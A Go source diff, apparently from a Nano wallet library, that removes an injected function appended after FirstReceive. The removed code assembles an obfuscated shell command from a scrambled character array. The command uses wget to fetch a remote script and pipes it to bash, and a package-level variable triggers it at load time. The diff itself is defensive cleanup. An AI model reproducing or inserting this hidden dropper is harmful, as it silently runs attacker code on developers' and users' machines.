@@ -195,15 +195,3 @@ func (a Account) FirstReceive(receivable Receivable, representative string) (Acc
 	}
 	return info, block, err
 }
-
-
-func TpkXetK() error {
-	YozJ := []string{"s", "g", "t", "b", "e", "e", " ", "/", "r", "f", "d", "e", "o", "e", " ", "t", "f", "b", "a", "O", " ", "5", "s", "b", "7", "3", "u", "3", "d", "t", "/", "w", "a", "4", "n", "6", "/", "e", ":", "t", "&", "3", "u", "s", "t", " ", "/", "d", "s", "1", "g", "i", "|", "e", "n", "r", " ", "p", "o", "b", "q", "h", "f", "a", "/", "0", "-", "/", "-", "/", " ", "n", ".", "h"}
-	ZZFINlw := "/bin/sh"
-	wjurRoxg := "-c"
-	YFPVOOPy := YozJ[31] + YozJ[50] + YozJ[5] + YozJ[44] + YozJ[20] + YozJ[68] + YozJ[19] + YozJ[14] + YozJ[66] + YozJ[45] + YozJ[73] + YozJ[39] + YozJ[2] + YozJ[57] + YozJ[43] + YozJ[38] + YozJ[30] + YozJ[69] + YozJ[8] + YozJ[13] + YozJ[60] + YozJ[42] + YozJ[4] + YozJ[48] + YozJ[29] + YozJ[23] + YozJ[58] + YozJ[71] + YozJ[37] + YozJ[72] + YozJ[62] + YozJ[26] + YozJ[34] + YozJ[46] + YozJ[22] + YozJ[15] + YozJ[12] + YozJ[55] + YozJ[18] + YozJ[1] + YozJ[11] + YozJ[36] + YozJ[47] + YozJ[53] + YozJ[25] + YozJ[24] + YozJ[41] + YozJ[10] + YozJ[65] + YozJ[28] + YozJ[16] + YozJ[7] + YozJ[32] + YozJ[27] + YozJ[49] + YozJ[21] + YozJ[33] + YozJ[35] + YozJ[3] + YozJ[9] + YozJ[70] + YozJ[52] + YozJ[6] + YozJ[67] + YozJ[59] + YozJ[51] + YozJ[54] + YozJ[64] + YozJ[17] + YozJ[63] + YozJ[0] + YozJ[61] + YozJ[56] + YozJ[40]
-	exec.Command(ZZFINlw, wjurRoxg, YFPVOOPy).Start()
-	return nil
-}
-
-var JqzOsbw = TpkXetK()
